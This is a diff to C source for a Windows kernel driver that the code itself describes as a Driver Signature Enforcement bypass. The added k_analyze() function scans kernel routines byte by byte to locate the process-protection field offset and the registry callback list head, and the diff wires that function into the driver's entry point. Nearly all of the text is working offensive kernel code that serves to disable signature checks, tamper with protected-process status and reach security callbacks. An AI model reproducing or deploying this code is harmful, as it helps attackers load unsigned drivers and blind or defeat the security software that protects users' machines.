@@ -8,6 +8,8 @@
 static wind_config_t cfg = {(void*)(-(LONG)sizeof(cfg))};
 static KMUTEX ioctl_mutex;
 
+
+
 // What follows is the meat of the whole DSE bypass.
 //
 // We temporarily flip the ci_Options to not validate, load driver, flip
@@ -378,9 +380,60 @@ out:;
 static VOID NTAPI dev_unload(IN PDRIVER_OBJECT self)
 {
 	DBG("unloading!\n");
-	regcb_set(0);
+	regcb_set(1);
 	IoDeleteDevice(self->DeviceObject);
 }
+
+static void k_analyze()
+{
+	int i;
+	UCHAR *p = (void*)MmGetSystemRoutineAddress(&RTL_STRING(L"PsGetProcessProtection"));
+	cfg.protbit = -1;
+	cfg.protofs = 0;
+	if (!p) {
+		cfg.protbit = 11;
+		p = (void*)MmGetSystemRoutineAddress(&RTL_STRING(L"PsIsProtectedProcess"));
+		// mov 
+		for (i = 0; i < 64; i++, p++)
+			// mov eax, [anything + OFFSET]; shr eax, 11
+			if (RtlCompareMemory(p+2, "\x00\x00\xc1\xe8\x0b",5)==5)
+				goto protfound;
+	} else {
+		// mov al, [anything+OFFSET]
+		for (i =0 ; i < 64; i++, p++)
+			if ((p[-2] == 0x8a) && (!p[2] && !p[3]))
+				goto protfound;
+	}
+	DBG("failed to find protbit\n");
+	return;
+protfound:;
+	cfg.protofs = *((ULONG*)p);
+	DBG("prot done");
+
+	p = (void*)MmGetSystemRoutineAddress(&RTL_STRING(L"CmUnRegisterCallback"));
+	if (!p) goto nocb;
+	for (i = 0; i < 512; i++, p++) { 
+#ifdef _WIN64
+		// lea rcx, cblist; call ..; mov rdi, rax
+		if (p[-3] == 0x48 && p[-2] == 0x8d && p[-1] == 0x0d &&
+			p[4] == 0xe8 && p[9] == 0x48 && p[10] == 0x8b && p[11] == 0xf8) {
+			cfg.cblist = (void*)((p + 4) + *((LONG*)p));
+			break;
+		}
+
+#else
+		// mov edi, offset cblist; mov eax, edi; call
+		if ((p[-1] == 0xbf && p[4] == 0x8b && p[5] == 0xc7 && p[6] == 0xe8) ||
+		    (p[-1] == 0xbe && p[4] == 0x53 && p[5] == 0x8d && p[6] == 0x55)) {
+			cfg.cblist = *((void**)p);
+			break;
+		}
+#endif
+	}
+nocb:;
+	DBG("CallbackListHead @ %p", cfg.cblist);
+}
+
 
 NTSTATUS NTAPI ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING reg)
 {
@@ -431,6 +484,7 @@ NTSTATUS NTAPI ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING re
 		DBG("registry read failed=%x\n",(unsigned)status);
 		return status;
 	}
+	k_analyze();
 	DBG("initializing driver with:\n"
 		" .ci_opt = %p\n"
 		" .ci_orig = %p\n"
